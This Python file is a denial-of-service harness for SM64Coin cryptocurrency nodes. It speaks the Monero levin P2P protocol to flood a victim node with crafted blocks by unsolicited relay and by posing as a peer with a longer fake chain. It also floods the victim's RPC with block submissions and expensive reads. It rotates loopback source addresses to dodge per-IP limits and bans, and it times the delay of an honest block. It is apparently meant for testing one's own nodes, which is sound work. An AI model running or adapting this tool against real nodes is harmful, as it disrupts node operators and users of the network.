#!/usr/bin/env python3
"""Denial-of-service harness for SM64Coin nodes (docs/DOS.md).

A minimal Monero levin peer that floods a victim node with blocks made by
`pow/sm64pow/examples/dos_blocks.rs`, then sends one honest block and times
how long the victim takes to accept it. Only for nodes you run yourself.

  attack.py fluffy  VICTIM_P2P BLOCKS.jsonl --ips N    relay blocks unasked (NOTIFY_NEW_FLUFFY_BLOCK)
  attack.py sync    VICTIM_P2P FAKE.jsonl  --ips N     pose as a peer with a longer chain, serve FAKE
  attack.py rpc     VICTIM_RPC BLOCKS.jsonl            submit_block over (restricted) RPC
  attack.py honest  VICTIM_P2P HONEST.jsonl            relay one block, wait until the victim's height passes it
  attack.py rpcread VICTIM_RPC HEIGHTS                 ask (restricted) RPC for the played pads of old blocks (HEIGHTS: "1-33")

Each attacker connection binds its own loopback source address (127.0.0.N),
so the victim sees N peers (Monero allows one connection per IP and bans by IP).
Prints one JSON line of results.
"""
import argparse, json, os, socket, struct, sys, threading, time, urllib.request

LEVIN_SIGNATURE = 0x0101010101012101
NETWORK_ID = bytes([0xB8, 0x82, 0xEC, 0xCA, 0x48, 0x41, 0x57, 0x0F, 0x80, 0xE3, 0x21, 0x6B, 0x8C, 0x43, 0xC3, 0xE8])  # sm64coin mainnet
HANDSHAKE, TIMED_SYNC, PING, SUPPORT_FLAGS = 1001, 1002, 1003, 1007
GET_OBJECTS, RESPONSE_GET_OBJECTS, REQUEST_CHAIN, RESPONSE_CHAIN_ENTRY, NEW_FLUFFY_BLOCK = 2003, 2004, 2006, 2007, 2008

# ---- epee portable storage ----
T_INT64, T_INT32, T_INT16, T_INT8, T_UINT64, T_UINT32, T_UINT16, T_UINT8, T_DOUBLE, T_STRING, T_BOOL, T_OBJECT, T_ARRAY = range(1, 14)
FLAG_ARRAY = 0x80


def ps_varint(v):
    if v < 1 << 6:
        return struct.pack('<B', v << 2)
    if v < 1 << 14:
        return struct.pack('<H', (v << 2) | 1)
    if v < 1 << 30:
        return struct.pack('<I', (v << 2) | 2)
    return struct.pack('<Q', (v << 2) | 3)


class U64(int): pass
class U32(int): pass
class U16(int): pass
class U8(int): pass


def ps_value(v):
    if isinstance(v, bool):
        return bytes([T_BOOL, 1 if v else 0])
    if isinstance(v, U64):
        return bytes([T_UINT64]) + struct.pack('<Q', v)
    if isinstance(v, U32):
        return bytes([T_UINT32]) + struct.pack('<I', v)
    if isinstance(v, U16):
        return bytes([T_UINT16]) + struct.pack('<H', v)
    if isinstance(v, U8):
        return bytes([T_UINT8]) + struct.pack('<B', v)
    if isinstance(v, (bytes, bytearray)):
        return bytes([T_STRING]) + ps_varint(len(v)) + bytes(v)
    if isinstance(v, dict):
        return bytes([T_OBJECT]) + ps_section(v)
    if isinstance(v, list):  # arrays of objects only
        out = bytes([T_OBJECT | FLAG_ARRAY]) + ps_varint(len(v))
        for e in v:
            out += ps_section(e)
        return out
    raise TypeError(type(v))


def ps_section(d):
    out = ps_varint(len(d))
    for k, v in d.items():
        kb = k.encode()
        out += bytes([len(kb)]) + kb + ps_value(v)
    return out


def ps_store(d):
    return struct.pack('<IIB', 0x01011101, 0x01020101, 1) + ps_section(d)


def ps_read_varint(b, i):
    m = b[i] & 3
    n = 1 << m
    v = int.from_bytes(b[i:i + n], 'little') >> 2
    return v, i + n


def ps_read_value(b, i, t):
    if t & FLAG_ARRAY:
        n, i = ps_read_varint(b, i)
        out = []
        for _ in range(n):
            v, i = ps_read_value(b, i, t & ~FLAG_ARRAY)
            out.append(v)
        return out, i
    sizes = {T_INT64: 8, T_INT32: 4, T_INT16: 2, T_INT8: 1, T_UINT64: 8, T_UINT32: 4, T_UINT16: 2, T_UINT8: 1, T_DOUBLE: 8, T_BOOL: 1}
    if t in sizes:
        n = sizes[t]
        return int.from_bytes(b[i:i + n], 'little'), i + n
    if t == T_STRING:
        n, i = ps_read_varint(b, i)
        return b[i:i + n], i + n
    if t == T_OBJECT:
        return ps_read_section(b, i)
    raise ValueError('type %d' % t)


def ps_read_section(b, i):
    n, i = ps_read_varint(b, i)
    d = {}
    for _ in range(n):
        kl = b[i]
        k = b[i + 1:i + 1 + kl].decode()
        i += 1 + kl
        t = b[i]
        i += 1
        d[k], i = ps_read_value(b, i, t)
    return d, i


def ps_load(b):
    return ps_read_section(b, 9)[0]


# ---- levin ----

def levin_packet(cmd, payload, request=True, expect_response=False, rc=0):
    flags = 1 if request else 2
    return struct.pack('<QQBIiII', LEVIN_SIGNATURE, len(payload), 1 if expect_response else 0, cmd, rc, flags, 1) + payload


class Peer:
    def __init__(self, victim, src_ip, height, top_id, cum_diff=None):
        host, port = victim.rsplit(':', 1)
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.bind((src_ip, 0))
        self.s.settimeout(30)
        self.s.connect((host, int(port)))
        self.height, self.top_id = height, top_id
        self.cum_diff = cum_diff if cum_diff is not None else height
        self.lock = threading.Lock()
        self.closed = False

    def send(self, cmd, d, request=True, expect_response=False, rc=0):
        with self.lock:
            self.s.sendall(levin_packet(cmd, ps_store(d), request, expect_response, rc))

    def recv(self):
        h = b''
        while len(h) < 33:
            c = self.s.recv(33 - len(h))
            if not c:
                raise EOFError
            h += c
        sig, cb, ret, cmd, rc, flags, ver = struct.unpack('<QQBIiII', h)
        assert sig == LEVIN_SIGNATURE
        body = b''
        while len(body) < cb:
            c = self.s.recv(min(1 << 20, cb - len(body)))
            if not c:
                raise EOFError
            body += c
        return cmd, flags, ret, body

    def sync_data(self):
        return {'current_height': U64(self.height), 'cumulative_difficulty': U64(self.cum_diff), 'cumulative_difficulty_top64': U64(0),
                'top_id': self.top_id, 'top_version': U8(16), 'pruning_seed': U32(0)}

    def handshake(self):
        node = {'network_id': NETWORK_ID, 'peer_id': U64(int.from_bytes(os.urandom(8), 'little')), 'my_port': U32(0),
                'rpc_port': U16(0), 'rpc_credits_per_hash': U32(0), 'support_flags': U32(1)}
        self.send(HANDSHAKE, {'node_data': node, 'payload_data': self.sync_data()}, expect_response=True)
        while True:
            cmd, flags, ret, body = self.recv()
            if cmd == HANDSHAKE and flags & 2:
                return ps_load(body)
            self.answer(cmd, flags, ret, body)

    def answer(self, cmd, flags, ret, body):
        """Answers the victim's housekeeping requests; returns the request otherwise."""
        if not flags & 1:
            return None
        if cmd == TIMED_SYNC:
            self.send(TIMED_SYNC, {'local_time': U64(int(time.time())), 'payload_data': self.sync_data(), 'local_peerlist_new': []}, request=False)
        elif cmd == PING:
            self.send(PING, {'status': b'OK', 'peer_id': U64(1)}, request=False)
        elif cmd == SUPPORT_FLAGS:
            self.send(SUPPORT_FLAGS, {'support_flags': U32(1)}, request=False)
        else:
            return (cmd, ps_load(body) if body else {})
        return None

    def fluffy(self, blob_hex, height):
        self.send(NEW_FLUFFY_BLOCK, {'b': {'block': bytes.fromhex(blob_hex), 'txs': []}, 'current_blockchain_height': U64(height + 1)})

    def close(self):
        self.closed = True
        try:
            self.s.close()
        except OSError:
            pass


def rpc(url, method, params=None, timeout=600):
    req = urllib.request.Request(url, json.dumps({'jsonrpc': '2.0', 'id': 0, 'method': method, 'params': params or {}}).encode(),
                                 {'Content-Type': 'application/json'})
    return json.load(urllib.request.urlopen(req, timeout=timeout))


def victim_tip(rpc_url):
    r = rpc(rpc_url, 'get_info')['result']
    return r['height'] - 1, bytes.fromhex(r['top_block_hash'])


def cpu_seconds(pid):
    with open('/proc/%d/stat' % pid) as f:
        p = f.read().rsplit(')', 1)[1].split()
    return (int(p[11]) + int(p[12])) / os.sysconf('SC_CLK_TCK')


def load(path):
    return [json.loads(l) for l in open(path) if l.strip()]


# ---- attacks ----

def attack_fluffy(a, blocks, top_h, top_id):
    """Each source IP relays its share of the blocks, as fast as the victim takes them."""
    sent = [0]
    dropped = [0]

    def run(k, share):
        ip = '127.0.%d.%d' % (1 + k // 250, 2 + k % 250)
        try:
            p = Peer(a.victim, ip, top_h + 1, top_id)
            p.handshake()
        except Exception as e:
            dropped[0] += 1
            return
        for b in share:
            try:
                p.fluffy(b['blob'], b['height'])
                sent[0] += 1
            except OSError:
                dropped[0] += 1
                break
        # Keep the connection until the victim has read it all (or drops us).
        t0 = time.time()
        p.s.settimeout(1)
        while time.time() - t0 < a.linger:
            try:
                cmd, flags, ret, body = p.recv()
                p.answer(cmd, flags, ret, body)
            except socket.timeout:
                continue
            except (EOFError, OSError):
                break
        p.close()

    threads = []
    n = a.ips
    for k in range(n):
        t = threading.Thread(target=run, args=(k, blocks[k::n]))
        t.start()
        threads.append(t)
    return threads, sent, dropped


def attack_sync(a, fake, top_h, top_id):
    """Pose as a peer whose chain is longer; serve the fake blocks when asked."""
    stats = {'served': 0, 'requests': 0}

    def run(k):
        ip = '127.0.%d.%d' % (100 + k // 250, 2 + k % 250)
        # Our claimed top is the fake chain's last block (unknown to the victim: it syncs from us).
        p = Peer(a.victim, ip, top_h + 1 + len(fake), bytes.fromhex(fake[-1]['id']), cum_diff=10 ** 9)
        try:
            p.handshake()
            t0 = time.time()
            while time.time() - t0 < a.linger:
                cmd, flags, ret, body = p.recv()
                req = p.answer(cmd, flags, ret, body)
                if not req:
                    continue
                cmd, d = req
                stats['requests'] += 1
                if cmd == REQUEST_CHAIN:
                    ids = top_id + b''.join(bytes.fromhex(b['id']) for b in fake)
                    p.send(RESPONSE_CHAIN_ENTRY, {'start_height': U64(top_h), 'total_height': U64(top_h + 1 + len(fake)),
                                                  'cumulative_difficulty': U64(10 ** 9), 'cumulative_difficulty_top64': U64(0),
                                                  'm_block_ids': ids, 'm_block_weights': b'', 'first_block': b''})
                elif cmd == GET_OBJECTS:
                    want = d.get('blocks', b'')
                    want = [want[i:i + 32].hex() for i in range(0, len(want), 32)]
                    blocks = [{'block': bytes.fromhex(b['blob']), 'txs': []} for b in fake if b['id'] in want]
                    p.send(RESPONSE_GET_OBJECTS, {'blocks': blocks, 'missed_ids': b'', 'current_blockchain_height': U64(top_h + 1 + len(fake))})
                    stats['served'] += len(blocks)
        except (EOFError, OSError, socket.timeout):
            pass
        p.close()

    threads = []
    for k in range(a.ips):
        t = threading.Thread(target=run, args=(k,))
        t.start()
        threads.append(t)
        time.sleep(a.stagger)
    return threads, stats


def attack_rpc(a, blocks):
    stats = {'sent': 0, 'accepted': 0, 'errors': {}}

    def run(share):
        for b in share:
            try:
                r = rpc(a.victim, 'submit_block', [b['blob']], timeout=600)
                stats['sent'] += 1
                if 'error' in r:
                    m = r['error'].get('message', '?')
                    stats['errors'][m] = stats['errors'].get(m, 0) + 1
                else:
                    stats['accepted'] += 1
            except Exception as e:
                stats['errors'][type(e).__name__] = stats['errors'].get(type(e).__name__, 0) + 1

    threads = []
    for k in range(a.ips):
        t = threading.Thread(target=run, args=(blocks[k::a.ips],))
        t.start()
        threads.append(t)
    return threads, stats


def attack_rpcread(a, heights):
    """Walks old blocks' played pads (each uncached one is a replay, plus a rebuild of its cycle)."""
    stats = {'sent': 0, 'ok': 0, 'errors': {}}
    stop = time.time() + a.duration

    def run(k):
        i = k
        while time.time() < stop:
            h = heights[i % len(heights)]
            i += a.ips
            try:
                r = rpc(a.victim, 'get_block', {'height': h, 'sm64_played': True}, timeout=600)
                stats['sent'] += 1
                if 'error' in r:
                    m = r['error'].get('message', '?')
                    stats['errors'][m] = stats['errors'].get(m, 0) + 1
                elif r['result'].get('sm64_played_pads'):
                    stats['ok'] += 1
                else:
                    stats['errors']['no pads'] = stats['errors'].get('no pads', 0) + 1
            except Exception as e:
                stats['errors'][type(e).__name__] = stats['errors'].get(type(e).__name__, 0) + 1

    threads = []
    for k in range(a.ips):
        t = threading.Thread(target=run, args=(k,))
        t.start()
        threads.append(t)
    return threads, stats


def send_honest(a, honest, top_h, top_id, ip='127.9.9.9'):
    """Relays the honest block from a fresh peer; returns seconds until the victim's height includes it."""
    b = honest[0]
    t0 = time.time()
    p = Peer(a.p2p or a.victim, ip, top_h + 1, top_id)
    p.handshake()
    p.fluffy(b['blob'], b['height'])
    deadline = t0 + a.honest_timeout
    while time.time() < deadline:
        try:
            h, _ = victim_tip(a.rpc)
            if h >= b['height']:
                p.close()
                return time.time() - t0
        except Exception:
            pass
        time.sleep(0.05)
    p.close()
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('mode', choices=['fluffy', 'sync', 'rpc', 'honest', 'rpcread'])
    ap.add_argument('--duration', type=float, default=20)
    ap.add_argument('victim')
    ap.add_argument('blocks')
    ap.add_argument('--rpc', required=True, help='victim unrestricted RPC json_rpc URL (to watch its height)')
    ap.add_argument('--pid', type=int, required=True, help='victim pid (to read its CPU time)')
    ap.add_argument('--ips', type=int, default=4)
    ap.add_argument('--linger', type=float, default=20)
    ap.add_argument('--stagger', type=float, default=0.5)
    ap.add_argument('--p2p', help='victim P2P host:port for the honest block (default: the victim argument)')
    ap.add_argument('--honest', help='honest block jsonl, relayed --honest-after seconds into the attack')
    ap.add_argument('--honest-after', type=float, default=2)
    ap.add_argument('--honest-timeout', type=float, default=300)
    ap.add_argument('--settle', type=float, default=0, help='extra seconds to wait for the victim after the attack')
    a = ap.parse_args()
    top_h, top_id = victim_tip(a.rpc)
    if a.mode == 'rpcread':
        lo, hi = a.blocks.split('-')
        blocks = list(range(int(lo), int(hi) + 1))
    else:
        blocks = load(a.blocks)
    c0, t0 = cpu_seconds(a.pid), time.time()
    out = {'mode': a.mode, 'blocks': len(blocks), 'ips': a.ips}
    honest_latency = [None]
    ht = None
    if a.honest:
        def h():
            time.sleep(a.honest_after)
            honest_latency[0] = send_honest(a, load(a.honest), top_h, top_id)
        ht = threading.Thread(target=h)
        ht.start()
    if a.mode == 'fluffy':
        threads, sent, dropped = attack_fluffy(a, blocks, top_h, top_id)
    elif a.mode == 'sync':
        threads, stats = attack_sync(a, blocks, top_h, top_id)
    elif a.mode == 'rpc':
        threads, stats = attack_rpc(a, blocks)
    elif a.mode == 'rpcread':
        threads, stats = attack_rpcread(a, blocks)
    else:
        threads = []
        honest_latency[0] = send_honest(a, blocks, top_h, top_id)
    for t in threads:
        t.join()
    if ht:
        ht.join()
    # The victim may still be working through what it was sent.
    time.sleep(a.settle)
    out['wall_s'] = round(time.time() - t0, 2)
    out['victim_cpu_s'] = round(cpu_seconds(a.pid) - c0, 2)
    if a.mode == 'fluffy':
        out['sent'], out['dropped_connections'] = sent[0], dropped[0]
    elif a.mode in ('sync', 'rpc', 'rpcread'):
        out.update(stats)
    out['honest_latency_s'] = None if honest_latency[0] is None else round(honest_latency[0], 2)
    out['victim_height_after'] = victim_tip(a.rpc)[0]
    print(json.dumps(out))


if __name__ == '__main__':
    main()
